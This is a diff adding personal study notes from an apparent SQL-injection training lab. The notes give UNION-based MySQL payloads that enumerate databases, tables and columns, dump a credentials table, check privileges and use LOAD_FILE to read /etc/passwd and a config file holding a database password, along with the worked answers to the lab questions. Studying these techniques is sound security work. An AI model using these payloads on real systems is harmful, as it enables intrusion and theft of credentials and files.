@@ -244,7 +244,65 @@ The answer is to run `cn' UNION select 1,user(),3,4-- -`
 
 ## Database Enumeration
 
+This section covers how to perform database enumeration of a databases once we have found a sql injection. Since this covers MySQL, it only covers how to verify if we are working with them.
+
+For that we can use SELECT @@version when we have full output. We can expect something like 10.3.22-MariaDB-1ubuntu1, or an error if its not MySQL.
+If we only have numeric output, we can use SELECT POW(1,1), and we can expect 1 as the output if we are on MySQL, or an error if not.
+Of if we have no output we can use, SELECT SLEEP(5) which will cause the page to wait 5 seconds before displaying.
+
+After we know we are on MySQL, we can start our enumeration. Our enumeration relies on the INFORMATION_SCHEMA database to do our work. So the first thing we can do is run:
+`SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;` Which will display all databases.
+
+So for our example sql injection it would look something like:
+`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
+
+Then we want to know which of these databases we are already working on so we can use database(), like:
+`cn' UNION select 1,database(),2,3-- -`
+
+Now we know which db we are on, we can start checking the other dbs, using the . operator.
+
+The first thing we want to knoiw is the tables in the other databases, which we can find in the TABLE_SCHEMA and TABLE_NAME columns in INFORMATION_SCHEMA.
+
+For our example we can use:
+`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
+
+Finally we want to know what the names of the columns in the tables we are interested in are. For this we can use COLUMN_NAME in INFORMATION_SCHEMA.
+
+For our example we can use:
+`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
+
+Then once we know what table we want we can just use our union select to get the information.
+`cn' UNION select 1, username, password, 4 from dev.credentials-- -`
+
+The question in this section was:
+What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database? 
+
+To answer this, I first ran `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -` to get the tables that are relevant.
+
+Then I ran `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -` to get the relevant columns.
+
+Then I ran `cn' UNION select 1, username, password, 4 from ilfreight.users-- -`
+
 ## Reading Files
+
+This page covers how to check what user we are and see if we have file read permissions.
+
+In MySQL we can use `SELECT USER()` to determine our user.
+We can use `SELECT super_priv FROM mysql.user` to determine if we have super admin priviliges.
+
+and we can use `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` to get a list of all of our priviliges.
+
+To load a file we can do `SELECT LOAD_FILE('/etc/passwd');`
+
+We can also get the source code of the page we are on using something like:
+`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
+
+The question for this section is:
+We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.
+
+To get this, we can look at the page source of the search.php page and notice they are importing a config.php file. Then all we need is run: `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -`
+
+That gives us the source of that file and the password is in the page.
 
 ## Writing Files
 
